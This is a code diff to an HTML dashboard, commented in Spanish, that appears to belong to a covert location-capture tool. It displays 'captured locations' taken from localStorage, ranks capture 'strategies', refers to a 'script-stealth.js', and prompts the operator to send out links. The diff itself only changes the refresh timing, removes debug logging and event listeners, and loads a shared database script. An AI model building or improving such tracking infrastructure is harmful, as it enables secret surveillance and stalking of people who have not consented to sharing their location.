@@ -318,27 +318,11 @@
             updateStats();
             refreshCaptures();
             
-            // Auto-refresh cada 5 segundos (más frecuente)
+            // Auto-refresh cada 10 segundos
             setInterval(() => {
                 updateStats();
                 refreshCaptures();
-            }, 5000);
-            
-            // Detectar cambios en localStorage desde otras pestañas
-            window.addEventListener('storage', function(e) {
-                if (e.key === 'capturedLocations') {
-                    console.log('localStorage cambió, actualizando...'); // Debug
-                    updateStats();
-                    refreshCaptures();
-                }
-            });
-            
-            // Detectar cambios en la misma pestaña
-            window.addEventListener('focus', function() {
-                console.log('Ventana enfocada, actualizando...'); // Debug
-                updateStats();
-                refreshCaptures();
-            });
+            }, 10000);
         });
         
         // Detectar URL base
@@ -388,10 +372,7 @@
         
         // Actualizar estadísticas
         function updateStats() {
-            // Usar la misma clave que script-stealth.js
             const capturedLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
-            
-            console.log('Actualizando stats, ubicaciones:', capturedLocations.length); // Debug
             
             // Total capturas
             document.getElementById('totalCaptures').textContent = capturedLocations.length;
@@ -430,13 +411,10 @@
             document.getElementById('bestStrategy').textContent = shortName[bestStrategy] || '-';
         }
         
-        // Refrescar capturas - usando la misma lógica que script-stealth.js
+        // Refrescar capturas
         function refreshCaptures() {
-            // Cargar desde localStorage con la misma clave que script-stealth.js
             const capturedLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
             const container = document.getElementById('capturedList');
-            
-            console.log('Ubicaciones encontradas:', capturedLocations.length); // Debug
             
             if (capturedLocations.length === 0) {
                 container.innerHTML = '<p style="color: #95a5a6; text-align: center; padding: 20px;">No hay capturas aún... ¡Envía los enlaces!</p>';
@@ -470,5 +448,6 @@
             window.open(url, '_blank');
         }
     </script>
+    <script src="shared-database.js"></script>
 </body>
 </html>
